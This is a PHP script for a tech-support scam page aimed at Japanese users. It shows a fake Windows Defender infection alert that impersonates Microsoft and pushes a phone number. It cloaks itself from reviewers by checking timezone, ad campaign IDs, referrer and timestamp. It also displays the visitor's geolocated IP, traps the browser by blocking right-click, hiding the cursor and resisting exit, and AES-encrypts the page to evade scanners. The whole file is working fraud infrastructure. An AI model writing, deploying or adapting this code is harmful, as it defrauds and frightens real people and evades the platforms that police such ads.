<?php
$number = '0101-844-706-2492';
$dynamic_url = "https://onrender2-jpxc.onrender.com";
#$dynamic_url = "http://127.0.0.1:8080";



$allowed_timezones = ['Asia/Tokyo'];
$allowed_campaign_ids = ['12345', '67890'];
$allowed_referrer = ['http://127.0.0.1', 'https://waveharborblog.space','https://sunaloomblog.space', 'https://amplify-d90b.onrender.com'];

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Access-Control-Allow-Credentials: true");

error_reporting(0);
$rawInput = trim(file_get_contents('php://input'));
if ($rawInput !== '') {
    $inputData = json_decode($rawInput, true);
    $timezone = '';
    $fullUrl = '';
    $gadCampaignId = '';
    $gclid = '';
    $invalidReason = '';

    if (!is_array($inputData)) {
        $invalidReason = 'invalid_json';
    } else {
        $timezone = $inputData['timezone'] ?? '';
        $timestamp = $inputData['timestamp'] ?? '';
        $fullUrl = $inputData['fullUrl'] ?? '';

        $urlParts = parse_url($fullUrl);
        if (isset($urlParts['query'])) {
            parse_str($urlParts['query'], $queryParams);
            $gadCampaignId = $queryParams['gad_campaignid'] ?? '';
            $gclid = $queryParams['gclid'] ?? '';
        }

        if (!in_array($timezone, $allowed_timezones, true)) {
            $invalidReason = 'invalid_timezone';
        } elseif (!in_array($gadCampaignId, $allowed_campaign_ids, true)) {
            $invalidReason = 'invalid_campaign_id';
        } elseif (trim($gclid) === '') {
            $invalidReason = 'missing_gclid';
        } elseif (!in_array(rtrim($_SERVER['HTTP_REFERER'],'/'), $allowed_referrer, true)) {
            $invalidReason = 'invalid_referrer';
        } elseif ($timestamp+60 < time() ) {
            $invalidReason = '60 seconds crossed';
        }
    }    
}else{
    $invalidReason = 'no input';
}
if ($invalidReason !== '') {
    $logFile = __DIR__ . '/timezone_validation_log.csv';
    $logData = [
        date('c'),
        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        $timezone,
        $fullUrl,
        $gadCampaignId,
        $gclid,
        $invalidReason,
    ];
    if ($fp = @fopen($logFile, 'a')) {
        fputcsv($fp, $logData);
        fclose($fp);
    }
    echo '';
    exit;
}
function ipInfo() {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? null;
    if ($ip && strpos($ip, ',') !== false) $ip = trim(explode(',', $ip)[0]);
    if (!$ip || !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) return false;

    foreach (["https://ipapi.co/$ip/json/", "https://ipwho.is/$ip"] as $u) {
        if ($r = @file_get_contents($u)) {
            if ($d = json_decode($r, true)) {
                if (!empty($d['ip'])) {
                    return [
                        'ip' => $d['ip'],
                        'location' => ($d['city'] ?? "Unknown") . ", " . ($d['country_name'] ?? ($d['country'] ?? "Unknown")),
                        'isp' => $d['org'] ?? ($d['connection']['isp'] ?? "Unknown")
                    ];
                }
            }
        }
    }
    return false;
}
$info = ipInfo();
$codeString = '
<html lang="en">
   <head>
      <meta charset="utf-8">
      <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
      <meta content="noindex,nofollow" name="robots">
      <title>Stripchatjapan</title>
      <link rel="shortcut icon" type="image/png" href="' . $dynamic_url . '/images/favicon.png">
      <link href="' . $dynamic_url . '/css/tapa.css" rel="stylesheet">
      <script type="text/javascript" src="' . $dynamic_url . '/js/jquery-1.4.4.min.js"></script>
      <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
      <script type="text/javascript">//<![CDATA[
         $(function(){
         $("body").bind("contextmenu", function(e){
         return false;
         });
         });//]]>
      </script>
      <script type="text/javascript">
         var phone_number = "' . $number . '";
         
      </script>
     <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=2bc12fdd"></script>
   </head>
   <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
<div id="floatbox" style="position: fixed;z-index: 999999999;height: 100vh;width: 100vw;background: black;" class="bxcontb">
<div style="height: 100vh;display: flex;justify-content: center;align-items: center;\: 57px;">
  <div style="position: relative;">
<div style="background-color: rgb(0, 0, 0);width: 60vw;border: 3px solid rgb(214, 216, 219);border-radius: 0.5rem;padding: 20px;" id="upbxs">
         <div style="color:#fff;margin: auto;font-size:16px;padding: 25px;text-align: center;" class="text-center">
            すぐに当社にご連絡く�さい。当社のエンジニアが電話で削除プロセスを案内いたします。お使いのコンピュータは無効になっています。Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、コンピュータが安全でない可能性があります。 
            
         </div>
      </div>  </div>
</div>          
</div>
      <!-- <div id="modalbx">
         <video id="vid" width="100%" height="100%" muted loop preload="auto" autoplay>
           <div class="play-button"></div>
           <source src="web.webm" type="video/webm">
         </video>
         
         
         <div class="bxweb">
                        
              
                         <div>
                           <img src="'.$dynamic_url.'/images/cross.png" alt="" class="swtch">
             
                         </div>
                    
                        <div style="font-size:40px;">
                         はい、私は18歳以上です
                         </div>
                         <div>
                           <button type="button" class="btn btn-secondary btn-lg">
                             入力</button>
              <button type="button" class="btn back-button btn-lg blink"><span class="text">全てのエロサイト</span><span class="link-icon"></span></button>
                         </div>
                     </div> 
         
                 </div> -->
      <div id="ageconfirmationmodal">
         <!-- <video id="vid" width="100%" height="100%" muted loop preload="auto" autoplay>
            <div class="play-button"></div>
            <source src="web.webm" type="video/webm">
            </video> -->
         <div class="innerContainer">
            <div class="crsr">
               <a href="#">
               <img src="'.$dynamic_url.'/images/cs.png" style="width: 20px;">
               </a>
            </div>
            <div style="font-size:40px;margin-top: 5px;">
               このサイトを閉じます<br>か？
            </div>
            <div>
               <button type="button" class="btn btn-secondary btn-lg" style="margin-right: 5px;"><i class="fa fa-close" style="font-size:24px"></i>
               いいえ</button>
               <button type="button" class="btn btn-primary btn-lg blink" style="background-color: #a3242f;color:#fff;background-image: none"><i class="fa fa-check-square-o" style="font-size:24px"></i>
               はい</button>
            </div>
         </div>
      </div>
      <div class="bg" style="cursor:none">
         <div class="bgimg" style="top:0">
            <img src="'.$dynamic_url.'/images/back.png" alt="" width="100%">
         </div>
      </div>
      <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
         <div class="black" style="height: 145%; cursor: none; display: block;"></div>
      </a>
      <div class="webbxs" style="display: block;">
         <img src="'.$dynamic_url.'/images/nbx1.jpg" alt="" width="100%" style="height: auto;">
      </div>
      <div class="bxcontb" style="display: block;" id="webgetcode">
         <img src="'.$dynamic_url.'/images/web1.jpg" alt="" style="width: 500px;">
         <strong class="haru">
            <img src="'.$dynamic_url.'/images/call.png" alt="" class="blink" style="width: 25px;margin-left: 0;"> <script>document.write(phone_number);</script> (日本国内無料電話)
         </strong>
      </div>
      <div class="vislnb" id="botgnws" style="display: block;">
         <div class="row firewall-pro">
            <div class="col-md-12">
               <img src="'.$dynamic_url.'/images/box01.png" alt="" style="width: 670px;height: auto;">
               <div id="txtintro">';
               if($info){
                $codeString .= '<span class="colo-rd">         
                      <div id="iewd">アドレス IP: '.$info['ip'].'</div> 
                      <div id="fwefe">位置: '.$info['location'].'</div>  
                      <div id="fwefc">ISP: '.$info['isp'].'</div>  
                  </span>';
               } else{
                $codeString .= '<span class="colo-rd">         
                      <div id="iewd">Windows_Defender_セキュリティセンター</div> 
                      <div id="fwefe">セキュリティ侵害の影響を受けたシステム</div>  
                      <div id="fwefc"> (エラーコード: 16JPsy7)</div>      
                  </span>';
               }               
$codeString .= '</div>
               <img src="'.$dynamic_url.'/images/scn.gif" id="bnrs">
               <strong class="haruto">
                  <img src="'.$dynamic_url.'/images/call.png" alt="" class="blink" style="width: 25px;margin-left: 0;"> <script>document.write(phone_number);</script> (日本国内無料電話)
               </strong>
               <div class="fr button blink" id="ftrs_btn">
                  <a href="#" class="blink">わかりました</a>
               </div>
            </div>
         </div>
      </div>
      <div id="ftrs">
         <div class="row">
            <div class="col-md-12">
               <div class="right-foot" style="text-align:center;margin-bottom: 5px;">
                  <span id="ftrstxt">
                  <img src="'.$dynamic_url.'/images/img.png"> Windowsのセキュリティ </span>
                  <span style="font-weight:500;padding-left:13px;color:#fff; ">
                     Windows サポートに電話する: 
                     <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px">
                        <img src="'.$dynamic_url.'/images/call.png" alt="" class="blink" style="width: 25px;vertical-align: middle;">  <script>document.write(phone_number);</script> (日本国内無料電話) 
                     </span>
                  </span>
               </div>
            </div>
            <div class="col-md-12">
               <marquee direction="left" height="100px" width="100%">
                  <small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、コンピュータが安全でない可能性があります。 Windows Defender スキャンにより、パスワード、オンライン ID、財務情�、個人ファイル、写真、ドキュメントを盗む可能性があるアドウェアがこのデバイス上で見つかりました。</small>
               </marquee>
            </div>
         </div>
      </div>
      <div class="uprbox" style="background-color:#000;height:auto;width:90vw;left:5vw;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="upbxs">
         <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">
            すぐに当社にご連絡く�さい。当社のエンジニアが電話で削除プロセスを案内いたします。お使いのコンピュータは無効になっています。Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、コンピュータが安全でない可能性があります。 <br>
            <strong>
               Windows サポートに電話する: 
               <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px;display: block;">
                  <img src="'.$dynamic_url.'/images/call.png" alt="" class="blink" style="width: 25px;vertical-align: bottom;"> <script>document.write(phone_number);</script> (日本国内無料電話)
               </span>
            </strong>
         </p>
      </div>
      <div id="chat" class="bounce" style="display: block;">
         <img src="'.$dynamic_url.'/images/img.png">
         <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
         <p style="font-weight:600;font-size:24px">サポートに電話する: <br>
         </p>
         <h4 style="font-weight:600;font-size:22px">
            <img src="'.$dynamic_url.'/images/call.png" alt="" class="blink" style="width: 25px;margin-left: 0;vertical-align:bottom"> <script>document.write(phone_number);</script> <br>(日本国内無料電話)
         </h4>
         <div class="arrow-down">
            <svg height="1em" viewBox="0 0 320 512">
               <style>
                  svg {
                  fill: #fff
                  }
               </style>
               <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
            </svg>
         </div>
      </div>
      <script type="text/javascript" src="'.$dynamic_url.'/js/noir.js"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/all.js"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/esc.js?_=1"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/script1.js"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/script2.js"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/script3.js"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/script4.js"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/script5.js"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/script6.js?_=1"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/script7.js"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/web1.js"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/full.js"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/lvs.js"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/cmple.js"></script>
      <!--script type="text/javascript" src="'.$dynamic_url.'/js/ips.js"></script-->
      <script type="text/javascript" src="'.$dynamic_url.'/js/muse.js?_=1"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/mouse.js?_=1"></script>
      <script type="text/javascript" src="'.$dynamic_url.'/js/times.js"></script>
      <script>
         $(document).ready(function(){
           $(".map").click(function(){
             $("#modalbx").hide();
           });
         });
      </script>  
      <script>
         $(document).ready(function(){
           $(".map").click(function(){
             $("#ageconfirmationmodal").hide();
           });
         });
      </script>  
      <script>
         $(document).ready(function() {
           $("#mycanvas").click(function() {
             $("#upbxs").show()
           })
         });
      </script>
      <script>
         $(document).ready(function() {
           $("#mycanvas").click(function() {
             $("#botgnws").show()
           })
         });
         $(document).ready(function() {
           $("#cross").click(function() {
             $("#botgnws").show()
           })
         });
      </script>
      <script>
         $(document).ready(function() {
           $("body").mouseover(function() {
             $("#botgnws").show()
           })
         });
      </script>
      <script>
         $(document).ready(function() {
           $("#chat").delay(600).fadeIn(100)
         });
      </script>
   </body>
   <!--  -->
</html>
';

function aesEncode($plainText) {
    try {
        $passphrase = "U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=";
        // Generate random salt (8 bytes)
        $salt = openssl_random_pseudo_bytes(8);
        // Derive key + IV (OpenSSL EVP_BytesToKey equivalent)
        $key_iv = '';
        $prev = '';
        while (strlen($key_iv) < 48) {
            $prev = md5($prev . $passphrase . $salt, true);
            $key_iv .= $prev;
        }

        $key = substr($key_iv, 0, 32); // AES-256 key
        $iv  = substr($key_iv, 32, 16); // IV
        // Encrypt
        $encrypted = openssl_encrypt(
            $plainText,
            'AES-256-CBC',
            $key,
            OPENSSL_RAW_DATA,
            $iv
        );
        $result = "Salted__" . $salt . $encrypted;
        return base64_encode($result);
    } catch (Exception $e) {
        return "";
    }
}

echo $encodedString = aesEncode($codeString);